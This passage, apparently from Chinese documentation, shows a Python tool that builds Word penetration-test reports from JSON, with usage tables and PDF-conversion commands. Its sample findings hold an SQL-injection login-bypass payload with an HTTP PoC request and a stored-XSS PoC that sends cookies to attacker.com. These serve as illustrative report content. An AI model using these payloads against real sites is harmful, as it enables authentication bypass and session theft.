            "retest": lambda: self.add_retest(data),
            "appendix": lambda self=self: self.add_appendix(data),
        }

        for section in sections:
            builder = section_builders.get(section)
            if builder:
                builder()

        # 保存
        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or ".", exist_ok=True)
        self.doc.save(output_path)
        print(f"[+] Word report generated: {output_path}")
        return output_path

    @staticmethod
    def from_json(json_path: str, output_path: str = "report.docx",
                   company: str = "安全评估团队") -> str:
        """从 JSON 文件加载数据并生成报告"""
        with open(json_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        generator = WordReportGenerator(company=company)
        return generator.generate(data, output_path)

    @staticmethod
    def batch_generate(reports_dir: str, output_dir: str = "./reports",
                        company: str = "安全评估团队"):
        """批量生成报告"""
        os.makedirs(output_dir, exist_ok=True)
        for filename in os.listdir(reports_dir):
            if filename.endswith(".json"):
                input_path = os.path.join(reports_dir, filename)
                output_name = filename.replace(".json", ".docx")
                output_path = os.path.join(output_dir, output_name)
                WordReportGenerator.from_json(input_path, output_path, company=company)
                print(f"[+] Generated: {output_path}")


# ===== 快速使用 =====
if __name__ == "__main__":
    # 示例数据
    sample_data = {
        "report_meta": {
            "report_id": "REP-2024-001",
            "project_id": "PT-2024-001",
            "client_name": "示例科技有限公司",
            "classification": "机密",
            "version": "v1.0",
            "tester": "张三",
            "reviewer": "李四",
            "approver": "王五",
            "test_start": "2024-06-01",
            "test_end": "2024-06-10",
            "report_date": "2024-06-15",
        },
        "executive_summary": {
            "overview": "本次安全评估共发现 9 个安全漏洞，其中严重 2 个，高危 3 个。"
                       "严重和高危合计占比 55.6%，整体安全风险评级为高危。",
            "risk_level": "高危",
            "total_findings": 9,
            "critical_count": 2,
            "high_count": 3,
            "medium_count": 2,
            "low_count": 1,
            "info_count": 1,
            "key_findings": [
                {"title": "SQL注入漏洞 - 登录接口", "severity": "Critical",
                 "impact": "可绕过认证获取全部用户数据"},
                {"title": "存储型XSS - 用户反馈功能", "severity": "Critical",
                 "impact": "可在管理后台执行任意JS"},
                {"title": "IDOR越权 - 订单查询接口", "severity": "High",
                 "impact": "可访问其他用户订单信息"},
            ],
        },
        "scope": {
            "targets": [
                {"url": "https://app.example.com", "type": "Web应用", "methodology": "黑盒+灰盒"},
                {"url": "https://api.example.com/v1", "type": "REST API", "methodology": "灰盒"},
                {"url": "https://admin.example.com", "type": "管理后台", "methodology": "黑盒"},
            ],
        },
        "methodology": {
            "tools": [
                {"name": "Burp Suite Professional", "version": "2024.x", "purpose": "HTTP代理、手动测试"},
                {"name": "Nuclei", "version": "3.x", "purpose": "自动化漏洞扫描"},
                {"name": "SQLMap", "version": "1.8.x", "purpose": "SQL注入检测与利用"},
                {"name": "Nmap", "version": "7.9x", "purpose": "端口/服务发现"},
            ],
        },
        "systems": [
            {"name": "主站 Web", "critical": 1, "high": 1, "medium": 1, "low": 0},
            {"name": "API 接口", "critical": 1, "high": 2, "medium": 1, "low": 0},
            {"name": "管理后台", "critical": 0, "high": 0, "medium": 0, "low": 1},
        ],
        "findings": [
            {
                "id": "VULN-001",
                "title": "SQL注入漏洞 - 登录接口",
                "severity": "Critical",
                "cvss_score": 9.8,
                "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "cvss_version": "3.1",
                "cve_id": "CVE-2024-XXXX",
                "cwe_id": "CWE-89",
                "owasp_category": "A03:2021 – Injection",
                "discovered_date": "2024-06-03",
                "affected_component": "/api/v1/login - username参数",
                "vuln_type": "SQL Injection",
                "status": "未修复",
                "description": "登录接口username参数未进行转义处理，直接拼接到SQL查询中。"
                              "攻击者可通过注入SQL语句绕过认证或获取数据库内容。",
                "reproduction_steps": [
                    "访问 https://app.example.com/login",
                    "在username字段输入: ' OR '1'='1' -- -",
                    "系统返回管理员会话Token",
                ],
                "poc": {
                    "type": "http_request",
                    "content": "POST /api/v1/login HTTP/1.1\nHost: app.example.com\n"
                               "Content-Type: application/json\n\n"
                               '{"username":"\\' OR \\'1\\'=\\'1\\' --","password":"test"}',
                },
                "impact": "攻击者可绕过认证获取全部用户数据，包括密码哈希和个人信息",
                "remediation": {
                    "short_term": "立即使用参数化查询替换字符串拼接",
                    "long_term": "引入ORM框架，实施输入验证白名单策略",
                    "priority": "P0",
                    "deadline": "24小时内",
                },
                "references": [
                    "https://owasp.org/www-community/attacks/SQL_Injection",
                    "https://cwe.mitre.org/data/definitions/89.html",
                ],
                "retest": {
                    "first_round": {"date": None, "status": "pending", "note": ""},
                    "second_round": {"date": None, "status": "pending", "note": ""},
                },
            },
            {
                "id": "VULN-002",
                "title": "存储型XSS - 用户反馈功能",
                "severity": "Critical",
                "cvss_score": 9.0,
                "cvss_vector": "AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H",
                "cve_id": "N/A",
                "cwe_id": "CWE-79",
                "owasp_category": "A03:2021 – XSS",
                "discovered_date": "2024-06-04",
                "affected_component": "/feedback/submit",
                "vuln_type": "Stored XSS",
                "status": "未修复",
                "description": "用户反馈内容未进行输出编码，攻击者可提交恶意JS代码。"
                              "当管理员查看反馈列表时，脚本在管理后台自动执行。",
                "reproduction_steps": [
                    "在反馈表单中提交: <script>alert(1)</script>",
                    "管理员查看反馈列表时脚本自动执行",
                ],
                "poc": {
                    "type": "html",
                    "content": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                },
                "impact": "攻击者可在管理后台执行任意JS代码，窃取管理员Cookie",
                "remediation": {
                    "short_term": "对用户输入进行上下文感知的输出编码",
                    "long_term": "实施Content-Security-Policy (CSP) 策略",
                    "priority": "P0",
                    "deadline": "24小时内",
                },
                "references": [
                    "https://owasp.org/www-community/attacks/xss/",
                ],
                "retest": {},
            },
        ],
    }

    # 生成报告
    generator = WordReportGenerator(company="安全评估团队")
    generator.generate(sample_data, "security_report.docx")
```

---

## 生成效果预览

| 章节 | 内容 | 样式特性 |
|:---|:---|---:|
| 封面 | 报告标题、副标题、元数据表 | 28pt 粗体标题、品牌色、居中对齐 |
| 目录 | Word TOC 域 | 可在 Word 中右键更新域 |
| 执行摘要 | 测试概况表、风险统计表、关键发现 | 交替行颜色、风险等级颜色标注 |
| 风险分布 | 严重性/类型/系统多维统计 | 进度条图示(█)、数据表 |
| 漏洞详情 | 每漏洞含基本信息表、描述、PoC、建议 | 风险等级颜色横幅、代码块 |
| 修复建议 | 优先级排序表、优先级定义 | P0-P3 颜色区分 |
| 附录 | 工具清单、术语表、免责声明 | 标准表格格式 |

## AI Agent 集成要点

| 能力 | 说明 |
|:---|:---|
| **输入** | 接受标准 JSON 数据（同 Markdown 模板的 JSON Schema） |
| **输出** | 生成 .docx 文件，可手动或自动转为 PDF |
| **调用方式** | `generator = WordReportGenerator(company="xx")` → `generator.generate(data, "report.docx")` |
| **从 JSON** | `WordReportGenerator.from_json("input.json", "report.docx")` |
| **批量处理** | `WordReportGenerator.batch_generate(input_dir, output_dir)` |
| **自定义章节** | 通过 `sections` 参数控制包含的章节: `generate(data, sections=["cover", "executive"])` |

## PDF 转换方法

```bash
# 方法1：使用 LibreOffice 命令行
libreoffice --headless --convert-to pdf security_report.docx

# 方法2：使用 python-docx2pdf
pip install docx2pdf
docx2pdf security_report.docx

# 方法3：手动转换
# 在 Word 中打开 → 文件 → 导出 → 创建 PDF/XPS
```

## 参考资源

- [python-docx 官方文档](https://python-docx.readthedocs.io/en/latest/)
- [python-docx GitHub](https://github.com/python-openxml/python-docx)
- [docx2pdf](https://github.com/AlJohri/docx2pdf)
- [LibreOffice 命令行转换](https://wiki.documentfoundation.org/Converting_documents)
- [Word Open XML 参考](https://docs.microsoft.com/en-us/office/open-xml/open-xml-sdk)
